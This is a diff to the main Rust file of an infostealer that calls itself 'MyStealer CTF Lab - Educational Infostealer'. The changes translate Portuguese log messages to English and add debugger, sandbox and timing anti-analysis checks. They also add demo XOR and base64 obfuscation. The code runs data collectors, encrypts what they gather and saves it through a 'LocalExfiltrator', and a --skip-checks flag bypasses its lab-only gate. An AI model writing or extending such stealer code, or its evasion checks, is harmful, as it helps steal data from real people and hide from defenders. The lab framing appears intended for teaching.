@@ -15,6 +15,7 @@ mod utils;
 
 use config::Config;
 use utils::anti_analysis::EnvironmentChecker;
+use utils::helpers::format_size;
 
 /// MyStealer CTF Lab - Educational Infostealer
 #[derive(Parser, Debug)]
@@ -72,28 +73,41 @@ async fn main() -> anyhow::Result<()> {
     // Verificar modo lab
     #[cfg(feature = "lab-mode")]
     {
-        info!("🔬 Modo laboratório ATIVO");
+        info!("[*] Lab mode ACTIVE");
         
         if !args.skip_checks {
-            info!("Verificando ambiente de laboratório...");
+            info!("[*] Checking environment...");
+            
+            // Anti-analysis checks
+            if EnvironmentChecker::is_debugger_present() {
+                warn!("[!] Debugger detected");
+            }
+            
+            if EnvironmentChecker::is_sandbox() {
+                warn!("[!] Sandbox indicators found");
+            }
+            
+            if EnvironmentChecker::timing_check() {
+                warn!("[!] Timing anomaly detected");
+            }
             
             match EnvironmentChecker::verify_lab_environment() {
                 Ok(true) => {
-                    info!("✅ Ambiente de laboratório verificado");
+                    info!("[+] Lab environment verified");
                 }
                 Ok(false) => {
-                    error!("❌ ERRO: Ambiente não parece ser um laboratório!");
-                    error!("Este software deve ser executado APENAS em VMs isoladas.");
-                    error!("Use --skip-checks para ignorar (PERIGOSO!)");
+                    error!("[-] Not a lab environment!");
+                    error!("[-] Run this ONLY in isolated VMs.");
+                    error!("[-] Use --skip-checks to bypass (DANGEROUS!)");
                     std::process::exit(1);
                 }
                 Err(e) => {
-                    warn!("⚠️ Não foi possível verificar ambiente: {}", e);
+                    warn!("[?] Could not verify environment: {}", e);
                 }
             }
         } else {
-            warn!("⚠️ AVISO: Verificações de segurança DESABILITADAS!");
-            warn!("⚠️ Você está por sua conta e risco!");
+            warn!("[!] Security checks DISABLED!");
+            warn!("[!] You're on your own!");
         }
     }
 
@@ -155,39 +169,49 @@ fn print_banner() {
 
 async fn run_collection(config: &Config) -> anyhow::Result<String> {
     use collectors::CollectorManager;
-    use crypto::CryptoManager;
+    use crypto::{CryptoManager, obfuscation};
     use exfil::LocalExfiltrator;
 
-    // Criar diretório de saída
     std::fs::create_dir_all(&config.output_dir)?;
 
-    // Inicializar gerenciador de coletores
     let mut manager = CollectorManager::new();
     
-    // Registrar coletores habilitados
     for module in &config.enabled_modules {
         manager.register_module(module)?;
     }
 
-    // Executar coleta
-    info!("Executando {} coletores...", manager.collector_count());
+    info!("[*] Running {} collectors...", manager.collector_count());
     let collected_data = manager.run_all().await?;
 
-    // Criptografar dados
-    info!("Criptografando dados coletados...");
+    info!("[*] Encrypting collected data...");
     let crypto = CryptoManager::new()?;
-    let encrypted = crypto.encrypt(&serde_json::to_vec(&collected_data)?)?;
+    let json_bytes = serde_json::to_vec(&collected_data)?;
+    let encrypted = crypto.encrypt(&json_bytes)?;
+    
+    info!("[*] Data size: {} -> {} (encrypted)", 
+        format_size(json_bytes.len() as u64),
+        format_size(encrypted.len() as u64));
 
-    // Salvar localmente (modo lab)
     let exfil = LocalExfiltrator::new(&config.output_dir);
     let output_path = exfil.save(&encrypted)?;
 
-    // Salvar versão legível (apenas lab)
     #[cfg(feature = "lab-mode")]
     {
+        // Readable JSON for analysis
         let readable_path = format!("{}/collected_data_readable.json", config.output_dir);
         std::fs::write(&readable_path, serde_json::to_string_pretty(&collected_data)?)?;
-        info!("📄 Versão legível salva em: {}", readable_path);
+        info!("[+] Readable version: {}", readable_path);
+        
+        // Demo XOR obfuscation
+        let key = b"labkey123";
+        let test_data = b"sensitive_string";
+        let encoded = obfuscation::xor_encode(test_data, key);
+        let decoded = obfuscation::xor_decode(&encoded, key);
+        assert_eq!(test_data.as_slice(), decoded.as_slice());
+        
+        // Demo base64
+        let b64 = obfuscation::b64_encode(&encrypted[..32.min(encrypted.len())]);
+        info!("[*] B64 sample: {}...", &b64[..32.min(b64.len())]);
     }
 
     Ok(output_path)
